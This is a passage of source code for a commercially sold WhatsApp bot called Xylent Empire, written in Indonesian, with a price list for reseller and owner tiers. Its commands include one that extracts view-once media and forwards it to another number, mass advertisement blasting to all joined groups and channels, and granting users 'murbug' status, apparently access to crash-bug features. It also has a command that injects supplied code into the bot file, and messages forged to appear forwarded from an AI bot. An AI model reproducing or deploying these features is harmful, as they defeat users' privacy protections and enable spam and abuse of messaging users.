buttonParamsJson: `{\"display_text\":\"Testimoni\",\"url\":\"https://whatsapp.com/channel/0029Vb7LQp1AojYtRXxiCT2U\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {quoted: qkontak})
await xylent.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}

break

case "script":
case "sc": {
await xylent.sendMessage(m.chat, { react: { text: "🎉",key: m.key,}}); 
let imgsc = await prepareWAMessageMedia({ image: fs.readFileSync("./image/Empire.jpg") }, { upload: xylent.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: ``,
}), 
contextInfo: {}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `( 👋 ) Hai Kak ${pushname} Tertarik Dengan Script Md Xylent? 
List Nya Di Bawah Ya Kak!

_🌟 XYLENT EMPIRE VIA_ *Tele X Wa X Apk :*
- *PAKET FULL UP* : 40k
- *PAKET RESELLER* : 60k
- *PAKET PARTNER* : 80k
- *PAKET T.K* : 100k
- *PAKET OWNER* : 150k

> *🚀 BENEFIT ROLE FULL UP :*
> _________________________
> ⭐ BISA JUAL APK ROLE HARIAN
> ⭐ FULL UPDATE PERMANEN
> ⭐ MASUK GB BUYER XYLENT
> _________________________

> *🚀 BENEFIT ROLE RESELLER :*
> _________________________
> 💫 BISA JUAL ROLE FULL UP
> 💫 BISA JUAL APK ROLE HARIAN
> 💫 FULL UPDATE PERMANEN
> 💫 MASUK GB BUYER XYLENT
> _________________________

> *🚀 BENEFIT ROLE PARTNER :*
> _________________________
> ✨ BISA JUAL ROLE FULL UP
> ✨ BISA JUAL ROLE RESELLER
> ✨ BISA JUAL APK ROLE HARIAN
> ✨ FULL UPDATE PERMANEN
> ✨ MASUK GB BUYER XYLENT
> ✨ DAPET BENEFIT LAIN ( JIKA ADA )
> _________________________

> *🚀 BENEFIT ROLE T.K :*
> _________________________
> ☄️ BISA JUAL ROLE FULL UP
> ☄️ BISA JUAL ROLE RESELLER
> ☄️ BISA JUAL ROLE PARTNER
> ☄️ BISA JUAL APK ROLE HARIAN
> ☄️ FULL UPDATE PERMANEN
> ☄️ MASUK GB BUYER XYLENT
> ☄️ ADMIN GB / CH XYLENT
> ☄️ DAPET BENEFIT LAIN ( JIKA ADA )
> _________________________

> *🚀 BENEFIT ROLE OWNER :*
> _________________________
> 💥 BISA JUAL ROLE FULL UP
> 💥 BISA JUAL ROLE RESELLER
> 💥 BISA JUAL ROLE PARTNER
> 💥 BISA JUAL ROLE T.K
> 💥 BISA JUAL APK ROLE HARIAN
> 💥 FULL UPDATE PERMANEN
> 💥 MASUK GB BUYER XYLENT
> 💥 ADMIN GB / CH XYLENT
> 💥 DAPET ALL BASE PRIVATE GW
> 💥 DAPET BENEFIT LAIN ( JIKA ADA )
> _________________________

*☎️ CHAT OWNER :*
• WhatsApp : wa.me/6287898109399
• Telegram : t.me/Pinnxzy
• Channel : t.me/XylentOfficial
`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Channel WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029Vb7LQp1AojYtRXxiCT2U\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Channel Telegram\",\"url\":\"https://t.me/XylentOfficial\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Auto Order Bot\",\"url\":\"https://t.me/XylentTesBot\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Information Xylent\",\"url\":\"https://whatsapp.com/channel/0029Vb82CCx9sBI5CeFqNY2T\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Testimoni\",\"url\":\"https://whatsapp.com/channel/0029Vb7LQp1AojYtRXxiCT2U\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {quoted: qkontak})
await xylent.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}

break;
// Case Owner
case "addowner": {
  if (!isCreator) return ReplyXylent(mess.owner)

  const q = args.join(" ")
  if (!q) 
    return ReplyXylent(`_*Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628xxxx_*`)

  let number = q.replace(/[^0-9]/g, '')
  let jid = number + "@s.whatsapp.net"

  let ceknya = await xylent.onWhatsApp(jid)
  if (!ceknya || ceknya.length === 0)
    return ReplyXylent("*Masukkan nomor WhatsApp yang valid!*")

  if (ownerbot.includes(jid))
    return ReplyXylent("*Nomor tersebut sudah menjadi owner!*")

  ownerbot.push(jid)
  fs.writeFileSync(OWNER_PATH, JSON.stringify(ownerbot, null, 2))

  ReplyXylent(`*Nomor ${number} berhasil ditambahkan sebagai owner!*`)
}
break

case "delowner": {
  if (!isCreator) return ReplyXylent(mess.owner) 

  const q = args.join(" ")
  if (!q)
    return ReplyXylent(`_*Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628xxxx_*`)

  let number = q.replace(/[^0-9]/g, '')
  let jid = number + "@s.whatsapp.net"

  if (!ownerbot.includes(jid))
    return ReplyXylent("*Nomor tersebut bukan owner!*")

  const index = ownerbot.indexOf(jid)
  ownerbot.splice(index, 1)

  fs.writeFileSync(OWNER_PATH, JSON.stringify(ownerbot, null, 2))

  ReplyXylent(`*Nomor ${number} berhasil dihapus dari owner!*`)
}
break

        case 'addmurbuggc':
if (!isCreator) return 
if (!isGroup) return ReplyXylent(mess.group) 
if (!isCreator) return ReplyXylent(mess.owner)
unli.push(m.chat)
fs.writeFileSync('./database/unli.json', JSON.stringify(unli))
ReplyXylent(`Seluruh member grup kini telah menjadi murbug`)
break
case "delmurbuggc":{

if (!isGroup) return ReplyXylent(mess.group)
if (!isCreator) return ReplyXylent(mess.owner)
unli.splice(m.chat)
fs.writeFileSync("./database/unli.json", JSON.stringify(unli))
ReplyXylent(`Seluruh member grup sudah tidak lagi menjadi murbug`)
}
break

        case "addmurbug": {
if (!isCreator) return ReplyXylent(mess.owner)
if (!args[0]) return ReplyXylent(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)

let nomor = args[0].replace(/[^0-9]/g, '')
let jid = nomor + "@s.whatsapp.net"

let cek = await xylent.onWhatsApp(jid)
if (!cek[0]?.exists) return ReplyXylent(`Nomor tidak terdaftar di WhatsApp!`)

let premium = JSON.parse(fs.readFileSync("./database/premium.json"))

if (premium.includes(jid)) 
return ReplyXylent(`Nomor ini sudah menjadi Murbug!`)

premium.push(jid)
fs.writeFileSync("./database/premium.json", JSON.stringify(premium, null, 2))

ReplyXylent(`✅ Nomor ${jid} berhasil jadi Murbug`)
}
break

case 'public': { 
if (!isCreator) return ReplyXylent(mess.owner);
if (xylent.public === true) return ReplyXylent("Success To Public Mode");
xylent.public = true
ReplyXylent("Success To Public Mode");
}
break

case 'self': {
if (!isCreator) return ReplyXylent(mess.owner);
if (xylent.public === false) return ReplyXylent("Success To Self Mode");
xylent.public = false
ReplyXylent("Success To Self Mode");
}
break

case "restart": case "rst": case "restartbot": {
  
  await ReplyXylent("Memproses _restart server_ . . .")
  var file = await fs.readdirSync("./session")
  var anu = await file.filter(i => i !== "creds.json")
  for (let t of anu) {
    await fs.unlinkSync(`./session/${t}`)
  }
  await ReplyXylent("Restarting bot...")
  process.exit(0)
}
break

// Cpanel Menu
case "listadmin": {
if (!isCreator) return ReplyXylent(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return ReplyXylent("Tidak ada admin panel")
var teks = "\n *#- List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await xylent.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break
//===============================================================
case 'totalfitur': {
    try {
        const filePath = path.join(__dirname, 'XylentEmpire.js');
        const data = fs.readFileSync(filePath, 'utf8');
        const regex = /case\s+['"`]([^'"`]+)['"`]\s*:/g;
        const matches = [...data.matchAll(regex)];
        const fitur = matches.map(v => v[1]);
        const total = fitur.length;
        await ReplyXylent(`〔 *XYLENT EMPIRE WhatsApp Bot* 〕
🤖 *Botname* : *Xylent Bot Md ( Multi Device )*
⚙️ *Version* : 2.0 Vip
📊 *Total Fitur* : ${total}

📢 *Information Script*
Script ini masih berada dalam tahap *pengembangan aktif*. Beberapa sistem masih terus disempurnakan untuk meningkatkan *stabilitas*, *performa*, serta pengalaman penggunaan yang lebih optimal.

✨ Pembaruan dan penambahan fitur akan dilakukan secara bertahap seiring proses pengembangan berjalan.
`);
    } catch (err) {
        await ReplyXylent(`❌ ${err.message}`);
    }
}
break;

// =====================
// CASE: addnomer
// =====================
case 'addnomer': {
  if (!isCreator) return xylent.sendMessage(from, { text: '❌ Hanya owner yang bisa menggunakan perintah ini!' }, { quoted: m });

  const nomer = args[0];
  if (!nomer) return xylent.sendMessage(from, { text: '❌ Masukkan nomor! Contoh: .addnomer 628xxxxxxxxxx' }, { quoted: m });

  const db = await loadDB();

  if (db.Numbers.includes(nomer)) {
    return xylent.sendMessage(from, { text: `⚠️ Nomor *${nomer}* sudah ada di database!` }, { quoted: m });
  }

  db.Numbers.push(nomer);
  saveDB(db);

  xylent.sendMessage(from, { text: `✅ Nomor *${nomer}* berhasil ditambahkan!` }, { quoted: m });
  break;
}

// =====================
// CASE: delnomer
// =====================
case 'delnomer': {
  if (!isCreator) return xylent.sendMessage(from, { text: '❌ Hanya owner yang bisa menggunakan perintah ini!' }, { quoted: m });

  const nomer = args[0];
  if (!nomer) return xylent.sendMessage(from, { text: '❌ Masukkan nomor! Contoh: .delnomer 628xxxxxxxxxx' }, { quoted: m });

  const db = await loadDB();

  if (!db.Numbers.includes(nomer)) {
    return xylent.sendMessage(from, { text: `⚠️ Nomor *${nomer}* tidak ditemukan di database!` }, { quoted: m });
  }

  db.Numbers = db.Numbers.filter(n => n !== nomer);
  saveDB(db);

  xylent.sendMessage(from, { text: `🗑️ Nomor *${nomer}* berhasil dihapus!` }, { quoted: m });
  break;
}

case 'listnomer': {
  const db = await loadDB();

  if (db.Numbers.length === 0) {
    return xylent.sendMessage(from, { text: '📋 Database nomor masih kosong!' }, { quoted: m });
  }

  const list = db.Numbers.map((n, i) => `${i + 1}. ${n}`).join('\n');
  xylent.sendMessage(from, { text: `📋 *Daftar Nomor Terdaftar:*\n\n${list}\n\nTotal: *${db.Numbers.length} nomor*` }, { quoted: m });
  break;
}

case 'listcase': {
  if (!isCreator) return reply(mess.owner)

  const filePath = path.join(__dirname, 'XylentEmpire.js')

  try {
    const data = fs.readFileSync(filePath, 'utf8')

    const regex = /case\s+['"`]([^'"`]+)['"`]\s*:/g
    const matches = [...data.matchAll(regex)]

    if (!matches.length) return reply('❌ Tidak ditemukan case.')

    const cases = matches.map(v => v[1])

    const chunkSize = 50
    const chunks = []

    for (let i = 0; i < cases.length; i += chunkSize) {
      chunks.push(cases.slice(i, i + chunkSize))
    }

    for (let i = 0; i < chunks.length; i++) {
      let text = `╭━━━〔 *LIST CASE BOT* 〕━━━⬣
┃ 📂 *Total Case* : ${cases.length}
┃ 📄 *Page* : ${i + 1}/${chunks.length}
╰━━━━━━━━━━━━━━━━⬣

`

      chunks[i].forEach((c, index) => {
        text += `${i * chunkSize + index + 1}. ${c}\n`
      })

      await reply(text)
    }

  } catch (err) {
    ReplyXylent('❌ Gagal membaca file.')
  }
}
break;

case 'addcase': {
  if (!isCreator) return ReplyXylent(mess.owner);
  if (!text) return ReplyXylent("Mana case nya");

  const path = 'XylentEmpire.js';

  fs.readFile(path, 'utf8', (err, data) => {
    if (err) return ReplyXylent('Gagal membaca file');

    const switchStart = data.indexOf("switch (command) {");
    if (switchStart === -1) return ReplyXylent('Tidak dapat menemukan switch statement');

    const openBrace = data.indexOf('{', switchStart);
    if (openBrace === -1) return ReplyXylent('Tidak dapat menemukan awal switch');


    const afterBrace = data.slice(openBrace + 1);
    if (afterBrace.includes(text)) return ReplyXylent('Case sudah ada');

    const caseText = `\n${text.trim()}\n    break\n`;
    const newData = data.slice(0, openBrace + 1) + caseText + afterBrace;

    fs.writeFile(path, newData, 'utf8', (err) => {
      if (err) return ReplyXylent('Gagal menulis file');
      ReplyXylent('✅ Case berhasil ditambahkan\n> Mohon gunakan fitur restart agar case aktif');
    });
  });
}
break;

case 'delcase': {
    if (!isCreator) return ReplyXylent(mess.owner);
    if (!text) return ReplyXylent("❌ Mana case yang mau dihapus?");

    const path = 'XylentEmpire.js';
    fs.readFile(path, 'utf8', (err, data) => {
        if (err) return ReplyXylent('❌ Gagal membaca file');

        const caseName = text.trim().replace(/[-/\\^$*+?.()|[\]{}]/g, '\\$&');
        const caseRegex = new RegExp(
    `case\\s+['"\`]${caseName}['"\`][\\s\\S]*?(?=\\n\\s*case\\s+['"\`]|$)`,
    'g'
);
        if (!caseRegex.test(data)) return ReplyXylent('⚠️ Case tidak ditemukan');

        const newData = data.replace(caseRegex, '');

        fs.writeFile(path, newData, 'utf8', (err) => {
            if (err) return ReplyXylent('❌ Gagal menulis file');
            ReplyXylent(`✅ Case "${caseName}" berhasil dihapus\n> Mohon gunakan fitur restart agar case terhapus`);
        });
    });
}
break;

case 'getcase': {
    if (!isCreator) return reply(mess.owner);
    if (!text) return reply("Case apa yang mau diambil?");

    try {
        const filePath = path.join(__dirname, 'XylentEmpire.js');
        const data = fs.readFileSync(filePath, 'utf8');

        const regex = new RegExp(
            `case\\s+['"\`]${text}['"\`]\\s*:[\\s\\S]*?(?=\\n\\s*case\\s+['"\`]|\n\\s*default:|$)`,
            'i'
        );

        const match = data.match(regex);
        if (!match) return reply('Case tidak ditemukan');

        const result = match[0].trim();

        if (result.length > 3500) {
            const fileName = `${text}.txt`;
            fs.writeFileSync(fileName, result);
            await xylent.sendMessage(
                m.chat,
                { document: fs.readFileSync(fileName), fileName, mimetype: 'text/plain' },
                { quoted: m }
            );
            fs.unlinkSync(fileName);
        } else {

            const subcontent = [
                {
                    messageType: 5,
                    codeMetadata: {
                        codeLanguage: "javascript",
                        codeBlocks: [
                            {
                                highlightType: 0,
                                codeContent: result
                            }
                        ]
                    }
                }
            ];

            const msg = generateWAMessageFromContent(m.chat, {
                botForwardedMessage: {
                    message: {
                        richResponseMessage: {
                            messageType: 1,
                            submessages: subcontent,
                            contextInfo: {
                                forwardingScore: 999999,
                                isForwarded: true,
                                forwardedAiBotMessageInfo: {
                                    botJid: "867051314767696@bot"
                                },
                                forwardOrigin: 4
                            }
                        }
                    }
                }
            }, { quoted: m });

            await xylent.relayMessage(m.chat, msg.message, {});
        }

    } catch (err) {
        reply('Terjadi kesalahan: ' + err.message);
    }
}
break;

case "send1xlihat": {
if (!m.quoted) return reply("Reply pesan viewOnce!")
let nomor = args[0]
if (!nomor) return reply(`Contoh:\n${prefix}send1xlihat kenomor tujuan\ncontoh .send1xlihat 628xxxx`)

let jid = nomor.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

try {
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]

    if (!msg[type].viewOnce) return reply("❌ Pesan itu bukan viewOnce!")

    // 🔥 ambil media
    let media = await downloadContentFromMessage(
        msg[type],
        type == 'imageMessage' ? 'image' :
        type == 'videoMessage' ? 'video' :
        'audio'
    )

    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }

    // 🔥 kirim ke nomor
    if (/video/.test(type)) {
        await xylent.sendMessage(jid, {
            video: buffer,
            caption: msg[type].caption || ""
        })
    } else if (/image/.test(type)) {
        await xylent.sendMessage(jid, {
            image: buffer,
            caption: msg[type].caption || ""
        })
    } else if (/audio/.test(type)) {
        await xylent.sendMessage(jid, {
            audio: buffer,
            mimetype: "audio/mpeg",
            ptt: true
        })
    }

    reply("✅ ViewOnce berhasil dikirim ke nomor!")

} catch (e) {
    console.log(e)
    reply("❌ Gagal kirim viewOnce")
}
}
break

case 'maintenance':
case 'perbaiki': {
  if (!isCreator) return ReplyXylent(mess.owner);

  const arg = args[0]?.toLowerCase();

  if (arg === 'on') {
    global.maintenance = true;
    return ReplyXylent(
      `✅ *Maintance Mode Online*\n` +
      `Semua Command Di Grup & Private Chat Telah Diblokir!`
    );

  } else if (arg === 'off') {
    global.maintenance = false;
    return ReplyXylent(
      `✅ *Maintance Mode Offline*\n\n` +
      `Bot sudah bisa digunakan kembali oleh semua user! 🎉`
    );

  } else {
    return ReplyXylent(
      `🔧 *Maintenance Tool*\n\n` +
      `• ${prefix}maint on  — Aktifkan maintenance\n` +
      `• ${prefix}maint off — Matikan maintenance\n\n` +
      `Status sekarang: ${global.maintenance ? '🔴 AKTIF' : '🟢 TIDAK AKTIF'}`
    );
  }
}
break;
//================================================================================
case 'accall': {
 if (!m.isGroup) return ReplyXylent(mess.group);
 
 const groupMetadata = await xylent.groupMetadata(m.chat);
 if (!groupMetadata.joinApprovalMode) return ReplyXylent('Fitur *Join Approval Mode* tidak aktif di grup ini.');

 const pendingList = await xylent.groupRequestParticipantsList(m.chat);
 if (!pendingList || pendingList.length === 0) return ReplyXylent('Gak ada member yang perlu di-ACC bos.');

 const jids = pendingList.map(v => v.jid);
 await xylent.groupRequestParticipantsUpdate(m.chat, jids, 'approve');

 ReplyXylent(`✅ Berhasil ACC *${jids.length}* member.`);
}
break;

case 'jpm':
case 'jpmv2': {
 if (!isCreator) return ReplyXylent(mess.owner);

 const fs = require('fs');
 const path = './database/jpm.json';
 if (!fs.existsSync('./database')) fs.mkdirSync('./database');
 if (!fs.existsSync(path)) fs.writeFileSync(path, JSON.stringify([]));
 let dbJpm = JSON.parse(fs.readFileSync(path));

 let q = m.quoted ? m.quoted : m;
 let content = {};
 
 if (/image/.test(q.mimetype || q.msg?.mimetype)) {
 let buffer = await xylent.downloadMediaMessage(q);
 if (!fs.existsSync('./Tmp')) fs.mkdirSync('./Tmp');
 const tempImg = `./Tmp/jpm_${Date.now()}.jpg`;
 fs.writeFileSync(tempImg, buffer);
 content.image = { url: tempImg };
 if (text) content.caption = text;
 } else if (text) {
 content.text = text;
 } else {
 return ReplyXylent(`*Format Salah!*\nContoh: ${prefix + command} Teks Iklan`);
 }

 let getGroups = await xylent.groupFetchAllParticipating();
 let groups = Object.values(getGroups);
 let rowsAll = [];
 let rowsSingle = [];

 rowsAll.push({
 title: "🚀 SEBAR KE SEMUA GRUP",
 description: `Kirim pesan ke ${groups.length} grup tanpa tag`,
 id: `.sendstatusall ${encodeURIComponent(JSON.stringify(content))} --normal`
 });

 rowsAll.push({
 title: "🚀 SEBAR KE SEMUA GROUP + TAG ALL",
 description: `Kirim pesan ke ${groups.length} grup dengan Tag All`,
 id: `.sendstatusall ${encodeURIComponent(JSON.stringify(content))} --tagall`
 });

 for (let res of groups) {
 if (!dbJpm.includes(res.id)) {
 rowsSingle.push({
 title: res.subject,
 description: `Kirim ke grup ini saja (ID: ${res.id})`,
 id: `.sendstatus ${res.id} ${encodeURIComponent(JSON.stringify(content))}`
 });
 }
 }

 let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 interactiveMessage: {
 body: { text: "📢 *JPM MENU*\nSilahkan pilih metode penyebaran iklan Anda." },
 footer: { text: `© Pinzy | Xylent` },
 nativeFlowMessage: {
 buttons: [{
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "PILIH TARGET",
 sections: [
 { title: "METODE MASSAL", rows: rowsAll },
 { title: "PILIH SATU GRUP", rows: rowsSingle }
 ]
 })
 }]
 }
 }
 }
 }
 }, { quoted: qkontak });

 await xylent.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break;

case "jpmch": {
 if (!isCreator) return ReplyXylent(mess.owner) 
 if (!text && !m.quoted) return ReplyXylent(example("Teksnya atau reply teks")); 
 var teks = m.quoted ? m.quoted.text : text; 
 let total = 0; 
 
 global.channels = loadChannels(); 
 
 if (global.channels.length === 0) 
 return ReplyXylent(` 
╔══════════════════════════╗ 
 ❌ *SALAHAN* ❌ 
╚══════════════════════════╝ 
⚠️ Tidak ada saluran terdaftar untuk *JPM*! 
Silakan daftarkan saluran terlebih dahulu. 
`); 

 ReplyXylent(` 
╭─❰ *PROCESSING MESSAGE* ❱─╮ 
📮 *Mengirim Pesan Ke*: 
 ➥ *${global.channels.length} Saluran* 
⏳ *Mohon Tunggu...* 
╰─────────────────────╯ 
 `); 
 
 for (let id of global.channels) { 
 try { 
 await xylent.sendMessage(id, { text: teks }, { quoted: qkontak }); 
 total += 1; 
 } catch (e) { 
 console.log(`⚠️ Gagal mengirim ke ${id}:`, e); 
 } 
 await sleep(global.delayjpmch); // jeda tiap pengiriman 
 } 
 
 ReplyXylent(` 
╭─❰ *RESULT SUMMARY* ❱─╮ 
📨 *Pesan Terkirim*: 
 ➥ *${total} Saluran* 
✅ *Status*: Berhasil! 
*Jeda : ${global.cooldown}*
💌 Terima kasih telah menggunakan layanan ini. 
╰─────────────────────╯ 
 `); 
}
break;
//===========≠====≠======≠======≠======≠======≠=======≠======≠=======≠======≠=====≠
case "listpanel": case "listp": case "listserver": {
if (!isCreator) return ReplyXylent(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return ReplyXylent("Tidak Ada Server Bot")
let messageText = "\n *#- List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/xylent/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await xylent.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================
case "deladmin": {
if (!isCreator) return ReplyXylent(mess.owner)
if (!text) return ReplyXylent(example("idnya"))
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return ReplyXylent("Akun admin panel tidak ditemukan!")
await ReplyXylent(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

case 'pin' :
case 'pinfoto': {
const axios = require('axios')
const https = require('https')

const agent = new https.Agent({
 rejectUnauthorized: true,
 maxVersion: 'TLSv1.3',
 minVersion: 'TLSv1.2'
});

async function getCookies() {
 try {
 const response = await axios.get('https://www.pinterest.com/csrf_error/', { httpsAgent: agent });
 const setCookieHeaders = response.headers['set-cookie'];
 if (setCookieHeaders) {
 const cookies = setCookieHeaders.map(cookieString => {
 const cookieParts = cookieString.split(';');
 return cookieParts[0].trim();
 });
 return cookies.join('; ');
 }
 return null;
 } catch {
 return null;
 }
}

async function pinterest(query) {
 try {
 const cookies = await getCookies();
 if (!cookies) return [];

 const url = 'https://www.pinterest.com/resource/BaseSearchResource/get/';
 const params = {
 source_url: `/search/pins/?q=${query}`,
 data: JSON.stringify({
 options: {
 isPrefetch: false,
 query: query,
 scope: "pins",
 no_fetch_context_on_resource: false
 },
 context: {}
 }),
 _: Date.now()
 };

 const headers = {
 'accept': 'application/json, text/javascript, */*, q=0.01',
 'accept-encoding': 'gzip, deflate',
 'accept-language': 'en-US,en;q=0.9',
 'cookie': cookies,
 'dnt': '1',
 'referer': 'https://www.pinterest.com/',
 'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
 'sec-ch-ua-full-version-list': '"Not(A:Brand";v="99.0.0.0", "Microsoft Edge";v="133.0.3065.92", "Chromium";v="133.0.6943.142"',
 'sec-ch-ua-mobile': '?0',
 'sec-ch-ua-model': '""',
 'sec-ch-ua-platform': '"Windows"',
 'sec-ch-ua-platform-version': '"10.0.0"',
 'sec-fetch-dest': 'empty',
 'sec-fetch-mode': 'cors',
 'sec-fetch-site': 'same-origin',
 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137000.0 Safari/537.36 Edg/137000.0',
 'x-app-version': 'c056fb7',
 'x-pinterest-appstate': 'active',
 'x-pinterest-pws-handler': 'www/[username]/[slug].js',
 'x-pinterest-source-url': '/hargr003/cat-pictures/',
 'x-requested-with': 'XMLHttpRequest'
 };

 const { data } = await axios.get(url, { httpsAgent: agent, headers, params });
 return data.resource_response.data.results
 .filter(v => v.images?.orig)
 .map(result => ({
 upload_by: result.pinner.username,
 fullname: result.pinner.full_name,
 followers: result.pinner.follower_count,
 caption: result.grid_title,
 image: result.images.orig.url,
 source: "https://id.pinterest.com/pin/" + result.id,
 }));
 } catch {
 return [];
 }
}

 if (!text) return reply(`*Penggunaan:* ${prefix + command} <query> <jumlah>\n\n*Contoh:* ${prefix + command} anime 3`);
 
 let [query, count] = text.split(' ');
 let imgCount = 5;

 if (text.indexOf(' ') !== -1) {
 const lastWord = text.split(' ').pop();
 if (!isNaN(lastWord) && lastWord.trim() !== '') {
 imgCount = parseInt(lastWord);
 query = text.substring(0, text.lastIndexOf(' '));
 } else {
 query = text;
 }
 } else {
 query = text;
 }
 
 reply('Searching Pinterest images...');
 
 try {
 const results = await pinterest(query);
 if (results.length === 0) return reply(`No results found for "${query}". Try another search term.`);
 
 const imagesToSend = Math.min(results.length, imgCount);
 reply(`Sending ${imagesToSend} Pinterest images for "${query}"...`);
 
 for (let i = 0; i < imagesToSend; i++) {
 await xylent.sendMessage(m.chat, { image: { url: results[i].image } });
 }
 } catch {
 reply('Error occurred while fetching Pinterest images. Please try again later.');
 }
}
break
//================================================================================
case "delpanel": {
if (!isCreator) return ReplyXylent(mess.owner)
if (!text) return ReplyXylent(example("idnya"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return ReplyXylent("Server panel tidak ditemukan!")
ReplyXylent(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator && !isReseller) return ReplyXylent(mess.owner)
if (!text) return ReplyXylent("username")
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
